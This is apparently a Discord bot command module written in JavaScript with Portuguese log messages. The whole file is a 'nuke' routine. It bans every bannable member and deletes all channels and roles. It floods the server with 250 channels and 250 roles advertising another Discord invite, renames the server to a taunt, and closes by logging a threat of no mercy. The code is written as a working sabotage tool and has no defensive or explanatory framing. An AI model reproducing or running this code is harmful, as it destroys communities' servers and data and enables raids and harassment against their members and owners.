const Discord = require('discord.js');
const colors = require('colors');

module.exports.run = async (client, msg, args) => {
    msg.delete();
    console.clear();
    console.log('[info] Banindo todos os membros do servidor...'.red);
    console.log(' ');
    await msg.guild.members.filter(member => member.bannable)
    .forEach(member => member.ban());
    console.log(`[sucess] Todos os membros da guild foram banidos.`.green);
    console.log(' ');
    console.log(`[info] Apagando todos os canais do servidor...`.red);
    await msg.guild.channels.deleteAll();
    console.log(' ');
    console.log(`[sucess] Todos os canais da guild foram deletados.`.green);
    console.log(' ')
    console.log('[info] Criando os canais de flood...'.red);
    for(i = 0; i < 250; i++){
        await msg.guild.createChannel('Por ásperos caminhos até aos astros.');
    }
    console.log(' ');
    console.log('[sucess] Canais criados.'.green);
    console.log(' ');
    console.log('[info] Mudando o nome da guild.'.red);
    console.log(' ');
    await msg.guild.setName('Desvanecidos pela Astro, fiquem bem 🥰')
    .then(updated => console.log(`[sucess] O nome da guild foi mudado para ${updated.name}.`.green))
    .catch(console.error);
    console.log(' ');
    console.log('[info] Apagando cargos...'.red);
    await msg.guild.roles.deleteAll();
    console.log(' ');
    console.log('[sucess] Todos os cargos apagados.'.green)
    console.log(' ');
    console.log('[info] Criando cargos de flood.'.red)
    for(i = 0; i < 250; i++) {
        await msg.guild.roles.create({ data: { name: 'discord.gg/bhop', permissions: ['SEND_MESSAGES'] } }).then(() => console.log('[sucess] Cargos de flood criado. '))
        .catch(console.error)
    }
    console.log(' ')
    console.log('[!] Que deus tenho piedade daqueles que mexeram conosco, pois nós mesmos, infelizmente, não teremos.'.blue);
}
